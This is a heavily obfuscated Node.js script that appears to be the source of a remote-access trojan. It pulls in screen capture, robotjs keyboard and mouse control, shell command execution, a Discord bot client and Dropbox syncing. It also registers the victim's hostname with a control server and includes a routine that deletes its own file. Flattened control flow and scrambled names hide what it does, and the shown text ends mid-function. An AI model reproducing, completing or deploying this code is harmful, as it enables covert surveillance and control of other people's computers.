const add = 'addhere';
const bot = 'bothere';


"use strict";

function _typeof( o ) {
  "@babel/helpers - typeof";
  return _typeof = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function ( o ) {
    return typeof o;
  } : function ( o ) {
    return o && "function" == typeof Symbol && o.constructor === Symbol && o !== Symbol.prototype ? "symbol" : typeof o;
  }, _typeof( o );
}

function _createForOfIteratorHelper( r, e ) {
  var t = "undefined" != typeof Symbol && r[ Symbol.iterator ] || r[ "@@iterator" ];
  if ( !t ) {
    if ( Array.isArray( r ) || ( t = _unsupportedIterableToArray( r ) ) || e && r && "number" == typeof r.length ) {
      t && ( r = t );
      var _n = 0,
        F = function F() {};
      return {
        s: F,
        n: function n() {
          return _n >= r.length ? {
            done: !0
          } : {
            done: !1,
            value: r[ _n++ ]
          };
        },
        e: function e( r ) {
          throw r;
        },
        f: F
      };
    }
    throw new TypeError( "Invalid attempt to iterate non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method." );
  }
  var o, a = !0,
    u = !1;
  return {
    s: function s() {
      t = t.call( r );
    },
    n: function n() {
      var r = t.next();
      return a = r.done, r;
    },
    e: function e( r ) {
      u = !0, o = r;
    },
    f: function f() {
      try {
        a || null == t[ "return" ] || t[ "return" ]();
      } finally {
        if ( u ) throw o;
      }
    }
  };
}

function _unsupportedIterableToArray( r, a ) {
  if ( r ) {
    if ( "string" == typeof r ) return _arrayLikeToArray( r, a );
    var t = {}.toString.call( r ).slice( 8, -1 );
    return "Object" === t && r.constructor && ( t = r.constructor.name ), "Map" === t || "Set" === t ? Array.from( r ) : "Arguments" === t || /^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test( t ) ? _arrayLikeToArray( r, a ) : void 0;
  }
}

function _arrayLikeToArray( r, a ) {
  ( null == a || a > r.length ) && ( a = r.length );
  for ( var e = 0, n = Array( a ); e < a; e++ ) n[ e ] = r[ e ];
  return n;
}

function _regeneratorRuntime() {
  "use strict"; /*! regenerator-runtime -- Copyright (c) 2014-present, Facebook, Inc. -- license (MIT): https://github.com/facebook/regenerator/blob/main/LICENSE */
  _regeneratorRuntime = function _regeneratorRuntime() {
    return e;
  };
  var t, e = {},
    r = Object.prototype,
    n = r.hasOwnProperty,
    o = Object.defineProperty || function ( t, e, r ) {
      t[ e ] = r.value;
    },
    i = "function" == typeof Symbol ? Symbol : {},
    a = i.iterator || "@@iterator",
    c = i.asyncIterator || "@@asyncIterator",
    u = i.toStringTag || "@@toStringTag";

  function define( t, e, r ) {
    return Object.defineProperty( t, e, {
      value: r,
      enumerable: !0,
      configurable: !0,
      writable: !0
    } ), t[ e ];
  }
  try {
    define( {}, "" );
  } catch ( t ) {
    define = function define( t, e, r ) {
      return t[ e ] = r;
    };
  }

  function wrap( t, e, r, n ) {
    var i = e && e.prototype instanceof Generator ? e : Generator,
      a = Object.create( i.prototype ),
      c = new Context( n || [] );
    return o( a, "_invoke", {
      value: makeInvokeMethod( t, r, c )
    } ), a;
  }

  function tryCatch( t, e, r ) {
    try {
      return {
        type: "normal",
        arg: t.call( e, r )
      };
    } catch ( t ) {
      return {
        type: "throw",
        arg: t
      };
    }
  }
  e.wrap = wrap;
  var h = "suspendedStart",
    l = "suspendedYield",
    f = "executing",
    s = "completed",
    y = {};

  function Generator() {}

  function GeneratorFunction() {}

  function GeneratorFunctionPrototype() {}
  var p = {};
  define( p, a, function () {
    return this;
  } );
  var d = Object.getPrototypeOf,
    v = d && d( d( values( [] ) ) );
  v && v !== r && n.call( v, a ) && ( p = v );
  var g = GeneratorFunctionPrototype.prototype = Generator.prototype = Object.create( p );

  function defineIteratorMethods( t ) {
    [ "next", "throw", "return" ].forEach( function ( e ) {
      define( t, e, function ( t ) {
        return this._invoke( e, t );
      } );
    } );
  }

  function AsyncIterator( t, e ) {
    function invoke( r, o, i, a ) {
      var c = tryCatch( t[ r ], t, o );
      if ( "throw" !== c.type ) {
        var u = c.arg,
          h = u.value;
        return h && "object" == _typeof( h ) && n.call( h, "__await" ) ? e.resolve( h.__await ).then( function ( t ) {
          invoke( "next", t, i, a );
        }, function ( t ) {
          invoke( "throw", t, i, a );
        } ) : e.resolve( h ).then( function ( t ) {
          u.value = t, i( u );
        }, function ( t ) {
          return invoke( "throw", t, i, a );
        } );
      }
      a( c.arg );
    }
    var r;
    o( this, "_invoke", {
      value: function value( t, n ) {
        function callInvokeWithMethodAndArg() {
          return new e( function ( e, r ) {
            invoke( t, n, e, r );
          } );
        }
        return r = r ? r.then( callInvokeWithMethodAndArg, callInvokeWithMethodAndArg ) : callInvokeWithMethodAndArg();
      }
    } );
  }

  function makeInvokeMethod( e, r, n ) {
    var o = h;
    return function ( i, a ) {
      if ( o === f ) throw Error( "Generator is already running" );
      if ( o === s ) {
        if ( "throw" === i ) throw a;
        return {
          value: t,
          done: !0
        };
      }
      for ( n.method = i, n.arg = a;; ) {
        var c = n.delegate;
        if ( c ) {
          var u = maybeInvokeDelegate( c, n );
          if ( u ) {
            if ( u === y ) continue;
            return u;
          }
        }
        if ( "next" === n.method ) n.sent = n._sent = n.arg;
        else if ( "throw" === n.method ) {
          if ( o === h ) throw o = s, n.arg;
          n.dispatchException( n.arg );
        } else "return" === n.method && n.abrupt( "return", n.arg );
        o = f;
        var p = tryCatch( e, r, n );
        if ( "normal" === p.type ) {
          if ( o = n.done ? s : l, p.arg === y ) continue;
          return {
            value: p.arg,
            done: n.done
          };
        }
        "throw" === p.type && ( o = s, n.method = "throw", n.arg = p.arg );
      }
    };
  }

  function maybeInvokeDelegate( e, r ) {
    var n = r.method,
      o = e.iterator[ n ];
    if ( o === t ) return r.delegate = null, "throw" === n && e.iterator[ "return" ] && ( r.method = "return", r.arg = t, maybeInvokeDelegate( e, r ), "throw" === r.method ) || "return" !== n && ( r.method = "throw", r.arg = new TypeError( "The iterator does not provide a '" + n + "' method" ) ), y;
    var i = tryCatch( o, e.iterator, r.arg );
    if ( "throw" === i.type ) return r.method = "throw", r.arg = i.arg, r.delegate = null, y;
    var a = i.arg;
    return a ? a.done ? ( r[ e.resultName ] = a.value, r.next = e.nextLoc, "return" !== r.method && ( r.method = "next", r.arg = t ), r.delegate = null, y ) : a : ( r.method = "throw", r.arg = new TypeError( "iterator result is not an object" ), r.delegate = null, y );
  }

  function pushTryEntry( t ) {
    var e = {
      tryLoc: t[ 0 ]
    };
    1 in t && ( e.catchLoc = t[ 1 ] ), 2 in t && ( e.finallyLoc = t[ 2 ], e.afterLoc = t[ 3 ] ), this.tryEntries.push( e );
  }

  function resetTryEntry( t ) {
    var e = t.completion || {};
    e.type = "normal", delete e.arg, t.completion = e;
  }

  function Context( t ) {
    this.tryEntries = [ {
      tryLoc: "root"
    } ], t.forEach( pushTryEntry, this ), this.reset( !0 );
  }

  function values( e ) {
    if ( e || "" === e ) {
      var r = e[ a ];
      if ( r ) return r.call( e );
      if ( "function" == typeof e.next ) return e;
      if ( !isNaN( e.length ) ) {
        var o = -1,
          i = function next() {
            for ( ; ++o < e.length; )
              if ( n.call( e, o ) ) return next.value = e[ o ], next.done = !1, next;
            return next.value = t, next.done = !0, next;
          };
        return i.next = i;
      }
    }
    throw new TypeError( _typeof( e ) + " is not iterable" );
  }
  return GeneratorFunction.prototype = GeneratorFunctionPrototype, o( g, "constructor", {
    value: GeneratorFunctionPrototype,
    configurable: !0
  } ), o( GeneratorFunctionPrototype, "constructor", {
    value: GeneratorFunction,
    configurable: !0
  } ), GeneratorFunction.displayName = define( GeneratorFunctionPrototype, u, "GeneratorFunction" ), e.isGeneratorFunction = function ( t ) {
    var e = "function" == typeof t && t.constructor;
    return !!e && ( e === GeneratorFunction || "GeneratorFunction" === ( e.displayName || e.name ) );
  }, e.mark = function ( t ) {
    return Object.setPrototypeOf ? Object.setPrototypeOf( t, GeneratorFunctionPrototype ) : ( t.__proto__ = GeneratorFunctionPrototype, define( t, u, "GeneratorFunction" ) ), t.prototype = Object.create( g ), t;
  }, e.awrap = function ( t ) {
    return {
      __await: t
    };
  }, defineIteratorMethods( AsyncIterator.prototype ), define( AsyncIterator.prototype, c, function () {
    return this;
  } ), e.AsyncIterator = AsyncIterator, e.async = function ( t, r, n, o, i ) {
    void 0 === i && ( i = Promise );
    var a = new AsyncIterator( wrap( t, r, n, o ), i );
    return e.isGeneratorFunction( r ) ? a : a.next().then( function ( t ) {
      return t.done ? t.value : a.next();
    } );
  }, defineIteratorMethods( g ), define( g, u, "Generator" ), define( g, a, function () {
    return this;
  } ), define( g, "toString", function () {
    return "[object Generator]";
  } ), e.keys = function ( t ) {
    var e = Object( t ),
      r = [];
    for ( var n in e ) r.push( n );
    return r.reverse(),
      function next() {
        for ( ; r.length; ) {
          var t = r.pop();
          if ( t in e ) return next.value = t, next.done = !1, next;
        }
        return next.done = !0, next;
      };
  }, e.values = values, Context.prototype = {
    constructor: Context,
    reset: function reset( e ) {
      if ( this.prev = 0, this.next = 0, this.sent = this._sent = t, this.done = !1, this.delegate = null, this.method = "next", this.arg = t, this.tryEntries.forEach( resetTryEntry ), !e )
        for ( var r in this ) "t" === r.charAt( 0 ) && n.call( this, r ) && !isNaN( +r.slice( 1 ) ) && ( this[ r ] = t );
    },
    stop: function stop() {
      this.done = !0;
      var t = this.tryEntries[ 0 ].completion;
      if ( "throw" === t.type ) throw t.arg;
      return this.rval;
    },
    dispatchException: function dispatchException( e ) {
      if ( this.done ) throw e;
      var r = this;

      function handle( n, o ) {
        return a.type = "throw", a.arg = e, r.next = n, o && ( r.method = "next", r.arg = t ), !!o;
      }
      for ( var o = this.tryEntries.length - 1; o >= 0; --o ) {
        var i = this.tryEntries[ o ],
          a = i.completion;
        if ( "root" === i.tryLoc ) return handle( "end" );
        if ( i.tryLoc <= this.prev ) {
          var c = n.call( i, "catchLoc" ),
            u = n.call( i, "finallyLoc" );
          if ( c && u ) {
            if ( this.prev < i.catchLoc ) return handle( i.catchLoc, !0 );
            if ( this.prev < i.finallyLoc ) return handle( i.finallyLoc );
          } else if ( c ) {
            if ( this.prev < i.catchLoc ) return handle( i.catchLoc, !0 );
          } else {
            if ( !u ) throw Error( "try statement without catch or finally" );
            if ( this.prev < i.finallyLoc ) return handle( i.finallyLoc );
          }
        }
      }
    },
    abrupt: function abrupt( t, e ) {
      for ( var r = this.tryEntries.length - 1; r >= 0; --r ) {
        var o = this.tryEntries[ r ];
        if ( o.tryLoc <= this.prev && n.call( o, "finallyLoc" ) && this.prev < o.finallyLoc ) {
          var i = o;
          break;
        }
      }
      i && ( "break" === t || "continue" === t ) && i.tryLoc <= e && e <= i.finallyLoc && ( i = null );
      var a = i ? i.completion : {};
      return a.type = t, a.arg = e, i ? ( this.method = "next", this.next = i.finallyLoc, y ) : this.complete( a );
    },
    complete: function complete( t, e ) {
      if ( "throw" === t.type ) throw t.arg;
      return "break" === t.type || "continue" === t.type ? this.next = t.arg : "return" === t.type ? ( this.rval = this.arg = t.arg, this.method = "return", this.next = "end" ) : "normal" === t.type && e && ( this.next = e ), y;
    },
    finish: function finish( t ) {
      for ( var e = this.tryEntries.length - 1; e >= 0; --e ) {
        var r = this.tryEntries[ e ];
        if ( r.finallyLoc === t ) return this.complete( r.completion, r.afterLoc ), resetTryEntry( r ), y;
      }
    },
    "catch": function _catch( t ) {
      for ( var e = this.tryEntries.length - 1; e >= 0; --e ) {
        var r = this.tryEntries[ e ];
        if ( r.tryLoc === t ) {
          var n = r.completion;
          if ( "throw" === n.type ) {
            var o = n.arg;
            resetTryEntry( r );
          }
          return o;
        }
      }
      throw Error( "illegal catch attempt" );
    },
    delegateYield: function delegateYield( e, r, n ) {
      return this.delegate = {
        iterator: values( e ),
        resultName: r,
        nextLoc: n
      }, "next" === this.method && ( this.arg = t ), y;
    }
  }, e;
}

function _defineProperty( e, r, t ) {
  return ( r = _toPropertyKey( r ) ) in e ? Object.defineProperty( e, r, {
    value: t,
    enumerable: !0,
    configurable: !0,
    writable: !0
  } ) : e[ r ] = t, e;
}

function _toPropertyKey( t ) {
  var i = _toPrimitive( t, "string" );
  return "symbol" == _typeof( i ) ? i : i + "";
}

function _toPrimitive( t, r ) {
  if ( "object" != _typeof( t ) || !t ) return t;
  var e = t[ Symbol.toPrimitive ];
  if ( void 0 !== e ) {
    var i = e.call( t, r || "default" );
    if ( "object" != _typeof( i ) ) return i;
    throw new TypeError( "@@toPrimitive must return a primitive value." );
  }
  return ( "string" === r ? String : Number )( t );
}

function asyncGeneratorStep( n, t, e, r, o, a, c ) {
  try {
    var i = n[ a ]( c ),
      u = i.value;
  } catch ( n ) {
    return void e( n );
  }
  i.done ? t( u ) : Promise.resolve( u ).then( r, o );
}

function _asyncToGenerator( n ) {
  return function () {
    var t = this,
      e = arguments;
    return new Promise( function ( r, o ) {
      var a = n.apply( t, e );

      function _next( n ) {
        asyncGeneratorStep( a, r, o, _next, _throw, "next", n );
      }

      function _throw( n ) {
        asyncGeneratorStep( a, r, o, _next, _throw, "throw", n );
      }
      _next( void 0 );
    } );
  };
}
var ATBf = require( "./node_modules/screenshot-desktop" );
var aJVu = require( "./node_modules/discord.js" );
var _require = require( "child_process" ),
  wNAF = _require.exec;
var jAjp = require( "util" ).promisify( setTimeout );
var orCp = require( "fs" );
var raTE = require( "os" );
var Zimu = require( "./node_modules/@hurdlegroup/robotjs" );
var _require2 = require( "./node_modules/@napi-rs/canvas" ),
  Dvcq = _require2.createCanvas,
  JdTx = _require2.Image;
var zPhV = require( "./node_modules/express" );
var qGoP = require( "http" );
var _require3 = require( "./node_modules/socket.io" ),
  qvAH = _require3.Server;
var JXVa = require( "./node_modules/axios" );
var rIRB = new aJVu.Client();
var ZUgD = "!";
var _require4 = require( "./node_modules/dropbox" ),
  LrLp = _require4.Dropbox;
var eNhJ = "http://localhost:2315";
var Ibtj = function Ibtj() {
  orCp.unlink( __filename, function ( cVTS ) {
    wsvb = 28;
    while ( wsvb < 29 ) switch ( wsvb ) {
    case 14:
      wsvb = 29;
      {
        console.error( "Error deleting script:", cVTS );
      }
      break;
    case 28:
      wsvb = cVTS ? 14 : 25;
      break;
    case 25:
      wsvb = 29;
      {
        console.log( "Script deleted successfully." );
      }
      break;
    }
    var wsvb;
  } );
};

function bmZR( _x ) {
  return _bmZR.apply( this, arguments );
}

function _bmZR() {
  _bmZR = _asyncToGenerator( /*#__PURE__*/ _regeneratorRuntime().mark( function _callee3( ZAZM ) {
    var WOxZ, rnTJ;
    return _regeneratorRuntime().wrap( function _callee3$( _context5 ) {
      while ( 1 ) switch ( _context5.prev = _context5.next ) {
      case 0:
        _context5.prev = 0;
        _context5.next = 3;
        return dbx.filesGetMetadata( _defineProperty( {}, "path", ZAZM ) );
      case 3:
        WOxZ = _context5.sent;
        return _context5.abrupt( "return", [ null ] == '' );
      case 7:
        _context5.prev = 7;
        _context5.t0 = _context5[ "catch" ]( 0 );
        rnTJ = 31;
      case 10:
        if ( !( rnTJ < 32 ) ) {
          _context5.next = 24;
          break;
        }
        _context5.t1 = rnTJ;
        _context5.next = _context5.t1 === 23 ? 14 : _context5.t1 === 19 ? 17 : _context5.t1 === 31 ? 20 : 22;
        break;
      case 14:
        rnTJ = 32;
        return _context5.abrupt( "return", null === undefined );
      case 17:
        rnTJ = 32;
        return _context5.abrupt( "return", [ 0 ] == '' );
      case 20:
        rnTJ = _context5.t0.response && _context5.t0.response.status === 409 ? 23 : 19;
        return _context5.abrupt( "break", 22 );
      case 22:
        _context5.next = 10;
        break;
      case 24:
      case "end":
        return _context5.stop();
      }
    }, _callee3, null, [
      [ 0, 7 ]
    ] );
  } ) );
  return _bmZR.apply( this, arguments );
}
var Rbbw = "./conf.aest";
var XFqY = "/conf.aest";
var jPvB = zPhV();
var OyDR = qGoP.createServer( jPvB );
var lYqv = new qvAH( OyDR );
var pRjR = process.env.PORT || 2315;
var qGUd = [];
var AlfH = [];
var TGNJ = "./bind.txt";
var MBrz = [];
var FZsn = null;
var InlZ = null;
var eECt = raTE.hostname();
var oIAx = "session-".concat( eECt );
var QDOg = rIRB.guilds.cache.get( InlZ );

function Vmut( rYJa ) {
  var lyQE = /[\u001b\u009b][[()#;?]*(?:[0-9]{1,4}(?:;[0-9]{0,4})*)?[0-9A-ORZcf-nqry=><]/g;
  return rYJa.replace( lyQE, "" );
}

function EigG() {
  return _EigG.apply( this, arguments );
}

function _EigG() {
  _EigG = _asyncToGenerator( /*#__PURE__*/ _regeneratorRuntime().mark( function _callee4() {
    var tWGw;
    return _regeneratorRuntime().wrap( function _callee4$( _context6 ) {
      while ( 1 ) switch ( _context6.prev = _context6.next ) {
      case 0:
        _context6.prev = 0;
        _context6.next = 3;
        return dbx.filesGetMetadata( _defineProperty( {}, "path", "/leader.aest" ) );
      case 3:
        return _context6.abrupt( "return", 1 == '1' );
      case 6:
        _context6.prev = 6;
        _context6.t0 = _context6[ "catch" ]( 0 );
        tWGw = 19;
      case 9:
        if ( !( tWGw < 34 ) ) {
          _context6.next = 23;
          break;
        }
        _context6.t1 = tWGw;
        _context6.next = _context6.t1 === 19 ? 13 : _context6.t1 === 17 ? 15 : _context6.t1 === 7 ? 18 : 21;
        break;
      case 13:
        tWGw = _context6.t0.response && _context6.t0.response.status === 409 ? 7 : 17;
        return _context6.abrupt( "break", 21 );
      case 15:
        tWGw = 34;
        return _context6.abrupt( "return", 1 === '1' );
      case 18:
        tWGw = 34;
        return _context6.abrupt( "return", null === undefined );
      case 21:
        _context6.next = 9;
        break;
      case 23:
      case "end":
        return _context6.stop();
      }
    }, _callee4, null, [
      [ 0, 6 ]
    ] );
  } ) );
  return _EigG.apply( this, arguments );
}

function GbUk() {
  return _GbUk.apply( this, arguments );
}

function _GbUk() {
  _GbUk = _asyncToGenerator( /*#__PURE__*/ _regeneratorRuntime().mark( function _callee5() {
    var hXWX, VJBy;
    return _regeneratorRuntime().wrap( function _callee5$( _context7 ) {
      while ( 1 ) switch ( _context7.prev = _context7.next ) {
      case 0:
        _context7.prev = 0;
        hXWX = "leader.aest";
        VJBy = orCp.readFileSync( hXWX, "utf8" );
        FZsn = VJBy;
        _context7.next = 6;
        return dbx.filesUpload( _defineProperty( _defineProperty( {}, "path", "/leader.aest" ), "contents", VJBy ) );
      case 6:
        _context7.next = 11;
        break;
      case 8:
        _context7.prev = 8;
        _context7.t0 = _context7[ "catch" ]( 0 );
        console.error( "Error uploading file:", _context7.t0 );
      case 11:
      case "end":
        return _context7.stop();
      }
    }, _callee5, null, [
      [ 0, 8 ]
    ] );
  } ) );
  return _GbUk.apply( this, arguments );
}

function MWdG() {
  return _MWdG.apply( this, arguments );
}

function _MWdG() {
  _MWdG = _asyncToGenerator( /*#__PURE__*/ _regeneratorRuntime().mark( function _callee6() {
    var agQw, IJSU, WtPN, zgji;
    return _regeneratorRuntime().wrap( function _callee6$( _context8 ) {
      while ( 1 ) switch ( _context8.prev = _context8.next ) {
      case 0:
        _context8.prev = 0;
        WtPN = 16;
      case 2:
        if ( !( WtPN < 35 ) ) {
          _context8.next = 51;
          break;
        }
        _context8.t0 = WtPN;
        _context8.next = _context8.t0 === 11 ? 6 : _context8.t0 === 16 ? 20 : _context8.t0 === 20 ? 29 : 49;
        break;
      case 6:
        WtPN = 35;
        _context8.t1 = console;
        _context8.next = 10;
        return EigG();
      case 10:
        _context8.t2 = _context8.sent;
        _context8.t1.log.call( _context8.t1, _context8.t2 );
        _context8.next = 14;
        return dbx.filesDownload( _defineProperty( {}, "path", "/leader.aest" ) );
      case 14:
        agQw = _context8.sent;
        orCp.writeFileSync( Rbbw, agQw.result.fileBinary.toString( "utf8" ), "utf8" );
        IJSU = orCp.readFileSync( Rbbw, "utf8" );
        FZsn = IJSU;
        orCp.writeFileSync( "leader.aest", IJSU, "utf8" );
        return _context8.abrupt( "break", 49 );
      case 20:
        _context8.next = 22;
        return EigG();
      case 22:
        if ( !_context8.sent ) {
          _context8.next = 26;
          break;
        }
        _context8.t3 = 11;
        _context8.next = 27;
        break;
      case 26:
        _context8.t3 = 20;
      case 27:
        WtPN = _context8.t3;
        return _context8.abrupt( "break", 49 );
      case 29:
        WtPN = 35;
        zgji = 24;
      case 31:
        if ( !( zgji < 30 ) ) {
          _context8.next = 48;
          break;
        }
        _context8.t4 = zgji;
        _context8.next = _context8.t4 === 18 ? 35 : _context8.t4 === 29 ? 39 : _context8.t4 === 24 ? 44 : 46;
        break;
      case 35:
        zgji = 30;
        _context8.next = 38;
        return GbUk();
      case 38:
        return _context8.abrupt( "break", 46 );
      case 39:
        zgji = 30;
        orCp.writeFileSync( "leader.aest", raTE.hostname(), "utf8" );
        _context8.next = 43;
        return GbUk();
      case 43:
        return _context8.abrupt( "break", 46 );
      case 44:
        zgji = orCp.existsSync( "leader.aest" ) ? 18 : 29;
        return _context8.abrupt( "break", 46 );
      case 46:
        _context8.next = 31;
        break;
      case 48:
        return _context8.abrupt( "break", 49 );
      case 49:
        _context8.next = 2;
        break;
      case 51:
        _context8.next = 61;
        break;
      case 53:
        _context8.prev = 53;
        _context8.t5 = _context8[ "catch" ]( 0 );
        _context8.t6 = console;
        _context8.next = 58;
        return EigG();
      case 58:
        _context8.t7 = _context8.sent;
        _context8.t6.log.call( _context8.t6, _context8.t7 );
        console.error( "Error downloading file:", _context8.t5 );
      case 61:
      case "end":
        return _context8.stop();
      }
    }, _callee6, null, [
      [ 0, 53 ]
    ] );
  } ) );
  return _MWdG.apply( this, arguments );
}

function rrrZ() {
  return _rrrZ.apply( this, arguments );
}

function _rrrZ() {
  _rrrZ = _asyncToGenerator( /*#__PURE__*/ _regeneratorRuntime().mark( function _callee7() {
    var kdRI, OfVh, NtxU;
    return _regeneratorRuntime().wrap( function _callee7$( _context9 ) {
      while ( 1 ) switch ( _context9.prev = _context9.next ) {
      case 0:
        _context9.prev = 0;
        _context9.next = 3;
        return EigG();
      case 3:
        kdRI = _context9.sent;
        OfVh = 7;
      case 5:
        if ( !( OfVh < 34 ) ) {
          _context9.next = 37;
          break;
        }
        _context9.t0 = OfVh;
        _context9.next = _context9.t0 === 7 ? 9 : _context9.t0 === 17 ? 11 : _context9.t0 === 33 ? 31 : 35;
        break;
      case 9:
        OfVh = kdRI === ( null === undefined ) ? 17 : 33;
        return _context9.abrupt( "break", 35 );
      case 11:
        OfVh = 34;
        NtxU = 11;
      case 13:
        if ( !( NtxU < 35 ) ) {
          _context9.next = 30;
          break;
        }
        _context9.t1 = NtxU;
        _context9.next = _context9.t1 === 20 ? 17 : _context9.t1 === 34 ? 21 : _context9.t1 === 11 ? 26 : 28;
        break;
      case 17:
        NtxU = 35;
        _context9.next = 20;
        return MWdG();
      case 20:
        return _context9.abrupt( "break", 28 );
      case 21:
        NtxU = 35;
        orCp.unlinkSync( "leader.aest" );
        _context9.next = 25;
        return GbUk();
      case 25:
        return _context9.abrupt( "break", 28 );
      case 26:
        NtxU = !orCp.existsSync( "leader.aest" ) ? 20 : 34;
        return _context9.abrupt( "break", 28 );
      case 28:
        _context9.next = 13;
        break;
      case 30:
        return _context9.abrupt( "break", 35 );
      case 31:
        OfVh = 34;
        _context9.next = 34;
        return MWdG();
      case 34:
        return _context9.abrupt( "break", 35 );
      case 35:
        _context9.next = 5;
        break;
      case 37:
        _context9.next = 42;
        break;
      case 39:
        _context9.prev = 39;
        _context9.t2 = _context9[ "catch" ]( 0 );
        console.error( "Error in dleaderfile:", _context9.t2 );
      case 42:
      case "end":
        return _context9.stop();
      }
    }, _callee7, null, [
      [ 0, 39 ]
    ] );
  } ) );
  return _rrrZ.apply( this, arguments );
}

function BIPZ( uidT ) {
  var uuBz = Math.ceil( uidT.length / 2 );
  var arhh = uidT.substring( 0 ? 3 : 0, uuBz );
  var mUlW = uidT.substring( uuBz );
  return arhh;
}

function fJsO() {
  return _fJsO.apply( this, arguments );
}

function _fJsO() {
  _fJsO = _asyncToGenerator( /*#__PURE__*/ _regeneratorRuntime().mark( function _callee8() {
    var NbbT, UZjO, CsZW, VsLA, WPvq, gqGS, IPKX, vMtF, Yotp, EDiK, PjKq, MqoP, AnBV, DJgk, QRBB, xtTM, ZRpB, qIny, pXoV, vhur;
    return _regeneratorRuntime().wrap( function _callee8$( _context10 ) {
      while ( 1 ) switch ( _context10.prev = _context10.next ) {
      case 0:
        NbbT = "".concat( eNhJ, "/get" );
        UZjO = "".concat( eNhJ, "/leadget" );
        CsZW = "".concat( eNhJ, "/lead" );
        VsLA = {};
        VsLA.authorization = "Bearer ".concat( BIPZ( Buffer.from( bot, "base64" ).toString( "ascii" ) ) );
        WPvq = VsLA;
        _context10.prev = 6;
        _context10.next = 9;
        return JXVa.get( NbbT, _defineProperty( {}, "headers", WPvq ) );
      case 9:
        gqGS = _context10.sent;
        DJgk = 17;
      case 11:
        if ( !( DJgk < 34 ) ) {
          _context10.next = 27;
          break;
        }
        _context10.t0 = DJgk;
        _context10.next = _context10.t0 === 28 ? 15 : _context10.t0 === 17 ? 19 : _context10.t0 === 33 ? 21 : 25;
        break;
      case 15:
        DJgk = 34;
        console.log( gqGS.data );
        console.log( "Invalid binded response." );
        return _context10.abrupt( "break", 25 );
      case 19:
        DJgk = gqGS.data !== null && gqGS.data !== "None" && gqGS.data !== "Unauthorized" && gqGS.data !== "Internal Server Error" ? 33 : 28;
        return _context10.abrupt( "break", 25 );
      case 21:
        DJgk = 34;
        InlZ = gqGS.data;
        console.log( gqGS.data );
        return _context10.abrupt( "break", 25 );
      case 25:
        _context10.next = 11;
        break;
      case 27:
        _context10.next = 32;
        break;
      case 29:
        _context10.prev = 29;
        _context10.t1 = _context10[ "catch" ]( 6 );
        console.error( "Error:", _context10.t1 );
      case 32:
        _context10.prev = 32;
        _context10.next = 35;
        return JXVa.get( UZjO, _defineProperty( {}, "headers", WPvq ) );
      case 35:
        IPKX = _context10.sent;
        console.log( "DATA " + IPKX.data );
        QRBB = 16;
      case 38:
        if ( !( QRBB < 35 ) ) {
          _context10.next = 95;
          break;
        }
        _context10.t2 = QRBB;
        _context10.next = _context10.t2 === 16 ? 42 : _context10.t2 === 11 ? 44 : _context10.t2 === 20 ? 88 : 93;
        break;
      case 42:
        QRBB = IPKX.data !== null && IPKX.data !== "Unauthorized" && IPKX.data !== "Internal Server Error" ? 11 : 20;
        return _context10.abrupt( "break", 93 );
      case 44:
        QRBB = 35;
        xtTM = 36;
      case 46:
        if ( !( xtTM < 37 ) ) {
          _context10.next = 86;
          break;
        }
        _context10.t3 = xtTM;
        _context10.next = _context10.t3 === 36 ? 50 : _context10.t3 === 22 ? 52 : 84;
        break;
      case 50:
        xtTM = IPKX.data !== "None" && IPKX.data !== "undefined" ? 22 : 37;
        return _context10.abrupt( "break", 84 );
      case 52:
        xtTM = 37;
        vMtF = {};
        vMtF.authorization = "Bearer ".concat( BIPZ( Buffer.from( bot, "base64" ).toString( "ascii" ) ) );
        vMtF.leader = "Bearer ".concat( raTE.hostname() );
        Yotp = vMtF;
        _context10.prev = 57;
        _context10.next = 60;
        return JXVa.get( CsZW, _defineProperty( {}, "headers", Yotp ) );
      case 60:
        EDiK = _context10.sent;
        ZRpB = 14;
      case 62:
        if ( !( ZRpB < 26 ) ) {
          _context10.next = 78;
          break;
        }
        _context10.t4 = ZRpB;
        _context10.next = _context10.t4 === 10 ? 66 : _context10.t4 === 25 ? 70 : _context10.t4 === 14 ? 74 : 76;
        break;
      case 66:
        ZRpB = 26;
        console.log( "RESPONSE " + EDiK.data );
        console.log( "Invalid leader binded response." );
        return _context10.abrupt( "break", 76 );
      case 70:
        ZRpB = 26;
        console.log( "Leader binded successful" );
        FZsn = raTE.hostname();
        return _context10.abrupt( "break", 76 );
      case 74:
        ZRpB = EDiK.data !== null && EDiK.data !== "None" && EDiK.data !== "Unauthorized" && EDiK.data !== "Internal Server Error" ? 25 : 10;
        return _context10.abrupt( "break", 76 );
      case 76:
        _context10.next = 62;
        break;
      case 78:
        _context10.next = 83;
        break;
      case 80:
        _context10.prev = 80;
        _context10.t5 = _context10[ "catch" ]( 57 );
        console.error( "Error:", _context10.t5 );
      case 83:
        return _context10.abrupt( "break", 84 );
      case 84:
        _context10.next = 46;
        break;
      case 86:
        console.log( IPKX.data );
        return _context10.abrupt( "break", 93 );
      case 88:
        QRBB = 35;
        FZsn = IPKX.data;
        console.log( IPKX.data );
        console.log( "Invalid leader response." );
        return _context10.abrupt( "break", 93 );
      case 93:
        _context10.next = 38;
        break;
      case 95:
        _context10.next = 156;
        break;
      case 97:
        _context10.prev = 97;
        _context10.t6 = _context10[ "catch" ]( 32 );
        qIny = 15;
      case 100:
        if ( !( qIny < 37 ) ) {
          _context10.next = 156;
          break;
        }
        _context10.t7 = qIny;
        _context10.next = _context10.t7 === 15 ? 104 : _context10.t7 === 22 ? 106 : _context10.t7 === 36 ? 110 : 154;
        break;
      case 104:
        qIny = _context10.t6.response && _context10.t6.response.data !== null && _context10.t6.response.data !== "Internal Server Error" ? 36 : 22;
        return _context10.abrupt( "break", 154 );
      case 106:
        qIny = 37;
        console.log( _context10.t6.response ? _context10.t6.response.data : "Unknown error" );
        console.log( "Invalid leader response." );
        return _context10.abrupt( "break", 154 );
      case 110:
        qIny = 37;
        pXoV = 29;
      case 112:
        if ( !( pXoV < 30 ) ) {
          _context10.next = 152;
          break;
        }
        _context10.t8 = pXoV;
        _context10.next = _context10.t8 === 13 ? 116 : _context10.t8 === 29 ? 148 : 150;
        break;
      case 116:
        pXoV = 30;
        PjKq = {};
        PjKq.authorization = "Bearer ".concat( BIPZ( Buffer.from( bot, "base64" ).toString( "ascii" ) ) );
        PjKq.leader = "Bearer ".concat( raTE.hostname() );
        MqoP = PjKq;
        _context10.prev = 121;
        _context10.next = 124;
        return JXVa.get( CsZW, _defineProperty( {}, "headers", MqoP ) );
      case 124:
        AnBV = _context10.sent;
        vhur = 31;
